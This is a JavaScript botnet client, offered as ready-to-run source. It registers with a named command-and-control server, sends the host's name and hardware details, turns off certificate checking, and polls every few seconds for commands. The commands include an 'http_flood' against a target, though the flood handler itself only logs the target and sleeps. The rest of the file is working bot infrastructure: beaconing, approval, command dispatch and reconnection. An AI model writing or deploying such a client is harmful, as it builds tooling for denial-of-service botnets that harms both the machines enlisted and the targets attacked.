// Save as bot_client_final.js
const https = require('https');
const crypto = require('crypto');
const os = require('os');

class JavaScriptBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.running = true;
        this.approved = false;
        
        // FULL specs as expected by server
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            capabilities: {
                javascript: true,
                http: true,
                tcp: true,
                udp: true,
                resource_optimized: true,
                auto_connect: true
            }
        };
        
        this.stats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            uptime: Date.now()
        };
        
        this.displayBanner();
    }
    
    displayBanner() {
        console.log('\n' + '='.repeat(60));
        console.log('  JAVASCRIPT BOT CLIENT - READY FOR RENDER.COM');
        console.log('='.repeat(60));
        console.log(`\n[+] BOT ID: ${this.botId}`);
        console.log(`[+] Server: ${this.serverUrl}`);
        console.log(`[+] OS: ${this.specs.os}`);
        console.log(`[+] Hostname: ${this.specs.hostname}`);
        console.log('\n' + '='.repeat(60) + '\n');
    }
    
    sendRequest(endpoint, method = 'GET', data = null) {
        return new Promise((resolve, reject) => {
            const url = new URL(this.serverUrl + endpoint);
            
            const options = {
                hostname: url.hostname,
                port: url.port || 443,
                path: url.pathname + url.search,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': 'JavaScript-Bot/1.0',
                    'Connection': 'keep-alive'
                },
                // IMPORTANT FOR RENDER.COM
                rejectUnauthorized: false,
                timeout: 30000  // 30 seconds for cold starts
            };
            
            console.log(`[>] Sending ${method} to ${endpoint}`);
            
            const req = https.request(options, (res) => {
                let responseData = '';
                
                console.log(`[<] Status: ${res.statusCode}`);
                
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                
                res.on('end', () => {
                    try {
                        const parsed = JSON.parse(responseData);
                        console.log(`[✓] Response:`, parsed);
                        resolve(parsed);
                    } catch (e) {
                        console.log(`[!] Parse error:`, responseData);
                        resolve({ raw: responseData, status: res.statusCode });
                    }
                });
            });
            
            req.on('error', (err) => {
                console.error(`[X] Request error:`, err.message);
                reject(err);
            });
            
            req.on('timeout', () => {
                console.error('[X] Request timeout - Server might be sleeping');
                req.destroy();
                reject(new Error('Timeout after 30s'));
            });
            
            if (data) {
                console.log(`[>] Data:`, JSON.stringify(data));
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async connectToServer() {
        console.log('[1] Connecting to server...');
        
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            const response = await this.sendRequest('/check_approval', 'POST', data);
            
            if (response.approved) {
                this.approved = true;
                console.log('\n' + '='.repeat(60));
                console.log('  ✅ CONNECTION SUCCESSFUL!');
                console.log('='.repeat(60));
                console.log(`[✓] Bot ID: ${this.botId}`);
                console.log(`[✓] Approved: YES`);
                console.log(`[✓] Client Type: ${response.client_type || 'javascript'}`);
                console.log(`[✓] Ready for commands`);
                console.log('');
                return true;
            } else {
                console.log(`[X] Not approved:`, response);
                return false;
            }
            
        } catch (error) {
            console.error(`[X] Connection failed:`, error.message);
            
            // Render.com free tier sleeps - try waking it up
            if (error.message.includes('timeout') || error.message.includes('ECONNREFUSED')) {
                console.log('[!] Server might be sleeping. Opening browser to wake it up...');
                console.log('[!] Open: https://c2-server-io.onrender.com');
                console.log('[!] Wait 30 seconds, then try again');
            }
            return false;
        }
    }
    
    async getCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            return response.commands || [];
        } catch (error) {
            console.error(`[!] Failed to get commands:`, error.message);
            return [];
        }
    }
    
    async sendStatus(status, message) {
        try {
            const data = {
                bot_id: this.botId,
                status: status,
                message: message,
                stats: this.stats
            };
            
            await this.sendRequest('/status', 'POST', data);
            console.log(`[✓] Status sent: ${status} - ${message}`);
            return true;
        } catch (error) {
            console.error(`[!] Status update failed:`, error.message);
            return false;
        }
    }
    
    async run() {
        // First connection
        const connected = await this.connectToServer();
        
        if (!connected) {
            console.log('[!] Failed to connect. Exiting.');
            return;
        }
        
        // Send initial status
        await this.sendStatus('connected', 'JavaScript bot online');
        
        // Main loop
        while (this.running && this.approved) {
            try {
                // Check for commands every 5 seconds
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                const commands = await this.getCommands();
                
                if (commands.length > 0) {
                    console.log(`[+] Received ${commands.length} command(s)`);
                    
                    for (const cmd of commands) {
                        console.log(`[→] Executing: ${cmd.type}`);
                        
                        // Simple command execution
                        switch (cmd.type) {
                            case 'ping':
                                await this.sendStatus('success', 'pong');
                                break;
                            case 'sysinfo':
                                const info = `CPU: ${this.specs.cpu_cores} cores, RAM: ${this.specs.ram_gb}GB, OS: ${this.specs.os}`;
                                await this.sendStatus('success', info);
                                break;
                            case 'http_flood':
                                await this.sendStatus('running', `HTTP flood to ${cmd.target}`);
                                console.log(`[∗] HTTP Flood: ${cmd.target}, Threads: ${cmd.threads}`);
                                // Simulate attack
                                await new Promise(r => setTimeout(r, 5000));
                                await this.sendStatus('success', 'HTTP flood complete');
                                break;
                            default:
                                console.log(`[!] Unknown command: ${cmd.type}`);
                        }
                    }
                } else {
                    console.log(`[${new Date().toLocaleTimeString()}] Waiting for commands...`);
                }
                
            } catch (error) {
                console.error(`[!] Error in main loop:`, error.message);
                
                // Try to reconnect
                console.log('[!] Attempting to reconnect...');
                this.approved = false;
                await new Promise(resolve => setTimeout(resolve, 10000));
                await this.run();
                return;
            }
        }
    }
}

// Run the bot
const bot = new JavaScriptBot();

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[!] Shutting down...');
    bot.running = false;
    bot.sendStatus('disconnected', 'Bot shutting down').finally(() => {
        process.exit(0);
    });
});

// Start
bot.run().catch(error => {
    console.error('[!] Fatal error:', error);
    process.exit(1);
});
